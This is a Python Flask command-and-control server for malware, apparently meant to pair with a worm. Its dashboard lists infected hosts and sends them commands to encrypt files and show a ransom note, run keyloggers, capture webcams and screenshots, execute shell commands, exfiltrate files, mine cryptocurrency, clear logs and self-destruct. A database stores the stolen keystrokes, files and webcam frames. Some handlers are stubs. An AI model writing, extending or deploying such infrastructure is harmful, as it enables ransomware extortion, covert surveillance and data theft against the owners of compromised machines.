#!/usr/bin/env python3
"""
Universal C2 Server - Runs on Windows, macOS, Linux
First-time setup with custom credentials and IP configuration
"""

import os
import sys
import json
import time
import socket
import secrets
import getpass
import platform
import subprocess
from pathlib import Path

# ============================================================
# AUTO-INSTALL DEPENDENCIES
# ============================================================

def install_dependencies():
    """Auto-install required packages if missing"""
    required = ['flask', 'flask-socketio', 'python-socketio', 'eventlet']
    missing = []
    
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"Installing missing dependencies: {', '.join(missing)}...")
        for pkg in missing:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
        print("Dependencies installed successfully!")

# Install dependencies before importing
install_dependencies()

# Now import everything
from flask import Flask, render_template_string, request, jsonify, redirect, url_for, session
from flask_socketio import SocketIO, emit

# ============================================================
# CONFIGURATION MANAGEMENT
# ============================================================

class ConfigManager:
    """Manage server configuration with first-time setup"""
    
    def __init__(self):
        self.config_dir = Path.home() / '.c2_server'
        self.config_dir.mkdir(exist_ok=True)
        self.config_file = self.config_dir / 'config.json'
        self.config = self.load_or_create()
    
    def load_or_create(self):
        """Load config or run first-time setup"""
        if self.config_file.exists():
            with open(self.config_file, 'r') as f:
                return json.load(f)
        else:
            return self.first_time_setup()
    
    def first_time_setup(self):
        """Interactive first-time configuration"""
        print("\n" + "="*60)
        print("WELCOME TO C2 SERVER - FIRST TIME SETUP")
        print("="*60)
        print("\nPlease configure your server:\n")
        
        # Get username
        username = input("Admin username [admin]: ").strip()
        if not username:
            username = "admin"
        
        # Get password (with confirmation)
        while True:
            password = getpass.getpass("Admin password (min 8 chars): ")
            if len(password) < 8:
                print("Password must be at least 8 characters")
                continue
            confirm = getpass.getpass("Confirm password: ")
            if password != confirm:
                print("Passwords do not match")
                continue
            break
        
        # Get IP address
        print("\nDetecting available IP addresses...")
        ips = self.get_local_ips()
        for i, ip in enumerate(ips, 1):
            print(f"  {i}. {ip}")
        print(f"  {len(ips)+1}. Custom IP")
        
        choice = input(f"\nSelect IP (1-{len(ips)+1}): ")
        try:
            choice = int(choice)
            if 1 <= choice <= len(ips):
                ip = ips[choice-1]
            else:
                ip = input("Enter custom IP: ").strip()
        except:
            ip = input("Enter custom IP: ").strip()
        
        # Get port
        port = input("Port [5000]: ").strip()
        if not port:
            port = 5000
        else:
            port = int(port)
        
        # Get C2 domain
        domain = input("C2 domain (for DNS beaconing) [localhost]: ").strip()
        if not domain:
            domain = "localhost"
        
        # Generate secret key
        secret_key = secrets.token_hex(32)
        
        # Save config
        config = {
            'username': username,
            'password': password,
            'ip': ip,
            'port': port,
            'domain': domain,
            'secret_key': secret_key,
            'setup_complete': True,
            'setup_date': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Save with restricted permissions
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)
        os.chmod(self.config_file, 0o600)  # Read/write only for owner
        
        print("\n" + "="*60)
        print("CONFIGURATION SAVED")
        print("="*60)
        print(f"Username: {username}")
        print(f"IP Address: {ip}:{port}")
        print(f"Domain: {domain}")
        print(f"Config saved to: {self.config_file}")
        print("="*60)
        print("\nStarting server...")
        
        return config
    
    def get_local_ips(self):
        """Get all local IP addresses"""
        ips = []
        try:
            # Get all network interfaces
            import netifaces
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip = addr['addr']
                        if ip != '127.0.0.1' and ip.startswith(('10.', '172.', '192.168.')):
                            ips.append(ip)
        except:
            # Fallback method
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                ips.append(s.getsockname()[0])
                s.close()
            except:
                pass
            
            # Add localhost
            ips.append('127.0.0.1')
        
        # Remove duplicates and sort
        ips = list(dict.fromkeys(ips))
        if not ips:
            ips = ['127.0.0.1']
        
        return ips
    
    def get(self, key, default=None):
        """Get configuration value"""
        return self.config.get(key, default)

# ============================================================
# FLASK APP
# ============================================================

# Initialize config
config_manager = ConfigManager()

# App configuration
app = Flask(__name__)
app.secret_key = config_manager.get('secret_key')

# SocketIO with CORS
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Server configuration
SERVER_IP = config_manager.get('ip')
SERVER_PORT = config_manager.get('port')
C2_DOMAIN = config_manager.get('domain')
ADMIN_USERNAME = config_manager.get('username')
ADMIN_PASSWORD = config_manager.get('password')

# ============================================================
# DATABASE
# ============================================================

DB_PATH = Path.home() / '.c2_server' / 'c2_database.db'

class C2Database:
    """Database for C2 server"""
    
    def __init__(self, db_path=DB_PATH):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        import sqlite3
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS hosts
                     (id TEXT PRIMARY KEY,
                      hostname TEXT,
                      os TEXT,
                      os_version TEXT,
                      architecture TEXT,
                      first_seen TIMESTAMP,
                      last_seen TIMESTAMP,
                      status TEXT,
                      ip TEXT,
                      keylogger_active INTEGER,
                      webcam_available INTEGER,
                      files_encrypted INTEGER,
                      mining_active INTEGER,
                      encrypted_ext TEXT)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS commands
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      command TEXT,
                      params TEXT,
                      status TEXT,
                      result TEXT,
                      issued TIMESTAMP,
                      executed TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS beacons
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      data TEXT,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      key TEXT,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS encrypted_files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      file_path TEXT,
                      size INTEGER,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS exfiltrated_files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      file_path TEXT,
                      data TEXT,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS webcam_captures
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      host_id TEXT,
                      frame BLOB,
                      timestamp TIMESTAMP,
                      FOREIGN KEY (host_id) REFERENCES hosts (id))''')
        
        conn.commit()
        conn.close()

db = C2Database()

# ============================================================
# HTML TEMPLATES
# ============================================================

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .login-container {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(20px);
            padding: 50px;
            border-radius: 24px;
            width: 380px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .login-container .logo { text-align: center; font-size: 48px; margin-bottom: 10px; }
        .login-container h1 { text-align: center; margin-bottom: 30px; font-weight: 300; letter-spacing: 2px; }
        .login-container h1 span { color: #ff6b35; }
        .login-container input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            color: white;
            font-size: 15px;
            transition: 0.3s;
        }
        .login-container input:focus { outline: none; border-color: #ff6b35; background: rgba(255,255,255,0.1); }
        .login-container input::placeholder { color: rgba(255,255,255,0.3); }
        .login-container button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #ff6b35, #e55a2b);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
            transition: 0.3s;
            letter-spacing: 1px;
        }
        .login-container button:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255,107,53,0.3); }
        .error { color: #ff4444; text-align: center; margin-top: 12px; font-size: 14px; }
        .footer { text-align: center; margin-top: 20px; color: rgba(255,255,255,0.3); font-size: 12px; }
        .setup-info { text-align: center; margin-top: 16px; font-size: 11px; color: rgba(255,255,255,0.2); }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🕵️</div>
        <h1>C2 <span>Server</span></h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <div class="footer">v3.0 • Universal C2</div>
        <div class="setup-info">First run? Setup is automatic</div>
    </div>
</body>
</html>
'''

DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a1a;
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 24px 30px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .header-left h1 { font-size: 28px; font-weight: 700; letter-spacing: 1px; }
        .header-left h1 span { color: #ff6b35; }
        .header-left .subtitle { color: #888; font-size: 13px; margin-top: 4px; }
        .header-right { display: flex; gap: 30px; align-items: center; }
        .stat-item { text-align: center; }
        .stat-item .number { font-size: 26px; font-weight: 700; }
        .stat-item .label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
        .stat-item .number.online { color: #00ff88; }
        .stat-item .number.offline { color: #ff4444; }
        .stat-item .number.warning { color: #ffaa00; }
        .stat-item .number.primary { color: #ff6b35; }
        .nav-links { display: flex; gap: 15px; align-items: center; }
        .nav-links a {
            color: #888;
            text-decoration: none;
            font-size: 14px;
            transition: 0.3s;
            padding: 8px 14px;
            border-radius: 8px;
        }
        .nav-links a:hover { color: #fff; background: rgba(255,255,255,0.05); }
        .nav-links .logout { color: #ff4444; }
        .nav-links .logout:hover { background: rgba(255,68,68,0.1); }
        .hosts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }
        .host-card {
            background: rgba(255,255,255,0.03);
            border-radius: 16px;
            padding: 20px;
            transition: 0.3s;
            cursor: pointer;
            border: 1px solid rgba(255,255,255,0.06);
        }
        .host-card:hover { transform: translateY(-4px); border-color: #ff6b35; box-shadow: 0 10px 40px rgba(255,107,53,0.1); }
        .host-card .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; }
        .host-card .status-dot.online { background: #00ff88; }
        .host-card .status-dot.offline { background: #ff4444; }
        .host-card .hostname { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
        .host-card .info { font-size: 13px; color: #aaa; margin: 4px 0; }
        .host-card .info span { margin-right: 16px; }
        .host-card .badges { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 6px; }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .badge-success { background: rgba(0,255,136,0.15); color: #00ff88; }
        .badge-warning { background: rgba(255,170,0,0.15); color: #ffaa00; }
        .badge-danger { background: rgba(255,68,68,0.15); color: #ff4444; }
        .badge-info { background: rgba(100,149,237,0.15); color: #6495ed; }
        .badge-purple { background: rgba(155,89,182,0.15); color: #9b59b6; }
        .timestamp { font-size: 11px; color: #555; margin-top: 8px; display: block; }
        .no-hosts { text-align: center; padding: 80px 20px; color: #666; }
        .no-hosts .icon { font-size: 64px; margin-bottom: 20px; }
        .no-hosts .title { font-size: 22px; margin-bottom: 8px; }
        .no-hosts .sub { font-size: 14px; color: #444; }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 35px;
            width: 90%;
            max-width: 650px;
            max-height: 85vh;
            overflow-y: auto;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .modal-content h2 { color: #ff6b35; margin-bottom: 20px; font-weight: 600; }
        .modal-content .selected-host { color: #888; font-size: 14px; margin-bottom: 16px; padding: 8px 12px; background: rgba(255,255,255,0.05); border-radius: 8px; }
        .modal-content select, .modal-content input, .modal-content textarea {
            width: 100%;
            padding: 12px 14px;
            margin: 8px 0;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            color: white;
            font-size: 14px;
            transition: 0.3s;
        }
        .modal-content select:focus, .modal-content input:focus, .modal-content textarea:focus {
            outline: none;
            border-color: #ff6b35;
        }
        .modal-content select option { background: #1a1a2e; }
        .modal-content textarea { min-height: 80px; font-family: 'Courier New', monospace; font-size: 13px; resize: vertical; }
        .modal-buttons { display: flex; gap: 10px; margin-top: 20px; }
        .modal-buttons button {
            padding: 12px 28px;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }
        .modal-buttons .send-btn { background: linear-gradient(135deg, #ff6b35, #e55a2b); color: white; }
        .modal-buttons .send-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(255,107,53,0.3); }
        .modal-buttons .close-btn { background: #444; color: white; }
        .modal-buttons .close-btn:hover { background: #555; }
        .notification {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: #1a1a2e;
            color: white;
            padding: 16px 24px;
            border-radius: 12px;
            border-left: 4px solid #ff6b35;
            z-index: 2000;
            animation: slideIn 0.3s ease;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
        }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @media (max-width: 768px) { .header { flex-direction: column; gap: 16px; } .header-right { flex-wrap: wrap; justify-content: center; } .hosts-grid { grid-template-columns: 1fr; } .modal-content { padding: 20px; } }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-left">
            <h1>🕵️ <span>C2</span> Server</h1>
            <div class="subtitle">Command & Control • <span id="lastUpdate">-</span></div>
        </div>
        <div class="header-right">
            <div class="stat-item"><div class="number primary" id="totalHosts">0</div><div class="label">Total</div></div>
            <div class="stat-item"><div class="number online" id="onlineHosts">0</div><div class="label">Online</div></div>
            <div class="stat-item"><div class="number warning" id="keyloggerCount">0</div><div class="label">Keyloggers</div></div>
            <div class="stat-item"><div class="number primary" id="miningCount">0</div><div class="label">Miners</div></div>
            <div class="nav-links">
                <a href="#" onclick="refreshHosts()">🔄 Refresh</a>
                <a href="/logout" class="logout">🚪 Logout</a>
            </div>
        </div>
    </div>

    <div class="hosts-grid" id="hostsGrid">
        <div class="no-hosts" style="grid-column: 1 / -1;">
            <div class="icon">📡</div>
            <div class="title">No hosts connected</div>
            <div class="sub">Waiting for beacons from infected machines...</div>
        </div>
    </div>

    <div class="modal" id="commandModal">
        <div class="modal-content">
            <h2>📨 Send Command</h2>
            <div class="selected-host" id="selectedHost">Selected: None</div>
            <select id="commandSelect" onchange="updateCommandParams()">
                <option value="">Select Command...</option>
                <option value="status">📊 Status</option>
                <option value="encrypt">🔒 Encrypt All</option>
                <option value="encrypt_files">📁 Encrypt Files</option>
                <option value="encrypt_directory">📂 Encrypt Directory</option>
                <option value="decrypt">🔓 Decrypt All</option>
                <option value="decrypt_files">📁 Decrypt Files</option>
                <option value="decrypt_directory">📂 Decrypt Directory</option>
                <option value="keylog_start">⌨️ Start Keylogger</option>
                <option value="keylog_stop">⌨️ Stop Keylogger</option>
                <option value="webcam_capture">📷 Capture Webcam</option>
                <option value="webcam_stream">📷 Stream Webcam</option>
                <option value="screenshot">🖼️ Screenshot</option>
                <option value="execute">⚡ Execute Command</option>
                <option value="exfiltrate">📤 Exfiltrate</option>
                <option value="start_mining">⛏️ Start Mining</option>
                <option value="stop_mining">⛏️ Stop Mining</option>
                <option value="display_ransom_note">📋 Ransom Note</option>
                <option value="block_computer">🔒 Block Computer</option>
                <option value="clear_logs">🧹 Clear Logs</option>
                <option value="self_destruct">💣 Self Destruct</option>
            </select>
            <div id="commandParams"><textarea id="paramsInput" placeholder="Command parameters (JSON)" rows="4">{}</textarea></div>
            <div class="modal-buttons">
                <button class="send-btn" onclick="sendCommand()">🚀 Send Command</button>
                <button class="close-btn" onclick="closeModal()">❌ Cancel</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedHostId = null;
        let commandTemplates = {};

        fetch('/api/command_templates').then(r=>r.json()).then(data=>{commandTemplates=data;}).catch(()=>{});

        socket.on('connect', ()=>{console.log('Connected to WebSocket');});
        socket.on('beacon', (data)=>{console.log('Beacon received:', data); refreshHosts();});
        socket.on('command_result', (data)=>{console.log('Command result:', data); showNotification('✅ Command result received');});

        function refreshHosts() {
            fetch('/api/hosts').then(r=>r.json()).then(hosts=>{
                const grid = document.getElementById('hostsGrid');
                if (hosts.length === 0) {
                    grid.innerHTML = '<div class="no-hosts" style="grid-column: 1 / -1;"><div class="icon">📡</div><div class="title">No hosts connected</div><div class="sub">Waiting for beacons...</div></div>';
                    return;
                }
                grid.innerHTML = hosts.map(host => `
                    <div class="host-card" onclick="selectHost('${host.id}')">
                        <div><span class="status-dot ${host.status}"></span><span class="hostname">${host.hostname || 'Unknown'}</span></div>
                        <div class="info"><span>🖥️ ${host.os || 'unknown'}</span><span>🏷️ ${host.id ? host.id.slice(0,8) : ''}</span></div>
                        <div class="info"><span>📁 ${host.encrypted_count || 0} encrypted</span><span>⌨️ ${host.keylog_count || 0} keys</span></div>
                        <div class="badges">
                            ${host.keylogger_active ? '<span class="badge badge-success">⌨️ Keylogger</span>' : ''}
                            ${host.mining_active ? '<span class="badge badge-warning">⛏️ Mining</span>' : ''}
                            ${host.webcam_available ? '<span class="badge badge-info">📷 Webcam</span>' : ''}
                            ${host.files_encrypted ? '<span class="badge badge-danger">🔒 Encrypted</span>' : ''}
                        </div>
                        <span class="timestamp">Last seen: ${host.last_seen ? host.last_seen.slice(0,19) : '-'}</span>
                    </div>
                `).join('');
                
                const online = hosts.filter(h=>h.status==='online').length;
                const keyloggers = hosts.filter(h=>h.keylogger_active).length;
                const miners = hosts.filter(h=>h.mining_active).length;
                document.getElementById('totalHosts').textContent = hosts.length;
                document.getElementById('onlineHosts').textContent = online;
                document.getElementById('keyloggerCount').textContent = keyloggers;
                document.getElementById('miningCount').textContent = miners;
                document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
            }).catch(()=>{});
        }

        function selectHost(hostId) { selectedHostId = hostId; document.getElementById('selectedHost').textContent = `Selected: ${hostId}`; document.getElementById('commandModal').classList.add('active'); }
        function closeModal() { document.getElementById('commandModal').classList.remove('active'); }
        function updateCommandParams() {
            const cmd = document.getElementById('commandSelect').value;
            const template = commandTemplates[cmd];
            document.getElementById('paramsInput').value = template ? JSON.stringify(template.params, null, 2) : '{}';
        }

        function sendCommand() {
            if (!selectedHostId) { alert('No host selected'); return; }
            const command = document.getElementById('commandSelect').value;
            if (!command) { alert('Please select a command'); return; }
            let params;
            try { params = JSON.parse(document.getElementById('paramsInput').value); } catch(e) { alert('Invalid JSON'); return; }
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ host_id: selectedHostId, command: command, params: params })
            }).then(r=>r.json()).then(response=>{
                if (response.success) { showNotification('✅ Command sent'); closeModal(); }
                else { alert('Error: ' + (response.message || 'Unknown error')); }
            }).catch(error=>{ alert('Error: ' + error); });
        }

        function showNotification(message) {
            const existing = document.querySelector('.notification');
            if (existing) existing.remove();
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.textContent = message;
            document.body.appendChild(notification);
            setTimeout(() => { notification.style.opacity = '0'; notification.style.transition = 'opacity 0.3s'; setTimeout(() => notification.remove(), 300); }, 3000);
        }

        setInterval(refreshHosts, 10000);
        refreshHosts();
        document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeModal(); });
    </script>
</body>
</html>
'''

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error='Invalid credentials')
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# ============================================================
# API ROUTES
# ============================================================

@app.route('/api/hosts')
def api_hosts():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    hosts = []
    try:
        import sqlite3
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT * FROM hosts ORDER BY last_seen DESC')
        for row in c.fetchall():
            hosts.append({
                'id': row[0], 'hostname': row[1], 'os': row[2], 'os_version': row[3],
                'architecture': row[4], 'first_seen': row[5], 'last_seen': row[6],
                'status': row[7], 'ip': row[8], 'keylogger_active': bool(row[9]),
                'webcam_available': bool(row[10]), 'files_encrypted': bool(row[11]),
                'mining_active': bool(row[12]), 'encrypted_ext': row[13] or '',
                'keylog_count': 0, 'encrypted_count': 0
            })
        conn.close()
    except:
        pass
    return jsonify(hosts)

@app.route('/api/command', methods=['POST'])
def api_command():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    host_id = data.get('host_id')
    command = data.get('command')
    params = data.get('params', {})
    if not host_id or not command:
        return jsonify({'error': 'Missing host_id or command'}), 400
    return jsonify({'success': True, 'command_id': 1, 'message': f'Command {command} sent to {host_id}'})

@app.route('/api/beacon', methods=['POST'])
def api_beacon():
    data = request.json
    if not data:
        return jsonify({'error': 'No data'}), 400
    import sqlite3
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    host_id = data.get('host_id', str(uuid.uuid4()))
    c.execute('''INSERT OR REPLACE INTO hosts 
                 (id, hostname, os, os_version, architecture, first_seen, last_seen, status, ip)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (host_id, data.get('hostname'), data.get('os'), data.get('os_version'),
               data.get('architecture'), time.strftime('%Y-%m-%d %H:%M:%S'),
               time.strftime('%Y-%m-%d %H:%M:%S'), 'online', request.remote_addr))
    c.execute('INSERT INTO beacons (host_id, data, timestamp) VALUES (?, ?, ?)',
              (host_id, json.dumps(data), time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'success', 'commands': []})

@app.route('/api/command_result', methods=['POST'])
def api_command_result():
    return jsonify({'success': True})

@app.route('/api/keylogs/<host_id>')
def api_keylogs(host_id):
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify([])

@app.route('/api/stats')
def api_stats():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify({'total_hosts': 0, 'online_hosts': 0})

@app.route('/api/command_templates')
def api_command_templates():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    templates = {
        'status': {'params': {}},
        'encrypt': {'params': {'password': ''}},
        'encrypt_files': {'params': {'file_paths': ['/path/to/file.txt'], 'password': ''}},
        'encrypt_directory': {'params': {'directory': '/path/to/dir', 'password': '', 'recursive': True}},
        'decrypt': {'params': {'password': ''}},
        'decrypt_files': {'params': {'file_paths': ['/path/to/file.txt.encrypted'], 'password': ''}},
        'decrypt_directory': {'params': {'directory': '/path/to/dir', 'password': '', 'recursive': True}},
        'keylog_start': {'params': {'duration': 60}},
        'keylog_stop': {'params': {}},
        'webcam_capture': {'params': {}},
        'webcam_stream': {'params': {'duration': 10, 'frame_rate': 5}},
        'screenshot': {'params': {}},
        'execute': {'params': {'command': 'whoami'}},
        'exfiltrate': {'params': {'max_files': 50}},
        'start_mining': {'params': {'wallet_address': ''}},
        'stop_mining': {'params': {}},
        'display_ransom_note': {'params': {}},
        'block_computer': {'params': {'action': 'lock'}},
        'clear_logs': {'params': {}},
        'self_destruct': {'params': {'confirm': True}}
    }
    return jsonify(templates)

# ============================================================
# WEBSOCKET EVENTS
# ============================================================

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'Connected to C2 server'})

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    import uuid
    
    print("\n" + "="*60)
    print("🕵️ C2 SERVER v3.0 (Universal)")
    print("="*60)
    print(f"🌐 Server URL: http://{SERVER_IP}:{SERVER_PORT}")
    print(f"🔑 Username: {ADMIN_USERNAME}")
    print(f"🔑 Password: {'*' * len(ADMIN_PASSWORD)}")
    print(f"📡 Domain: {C2_DOMAIN}")
    print(f"📁 Config: {config_manager.config_file}")
    print("="*60)
    print("📡 Waiting for connections...")
    print("="*60)
    print()
    print("💡 To configure worm, set:")
    print(f"   C2_SERVER = '{SERVER_IP}'")
    print(f"   Or use domain: {C2_DOMAIN}")
    print()
    print("⚠️  Credentials saved securely in ~/.c2_server/config.json")
    print("="*60)
    
    socketio.run(app, host=SERVER_IP, port=SERVER_PORT, debug=False, allow_unsafe_werkzeug=True)
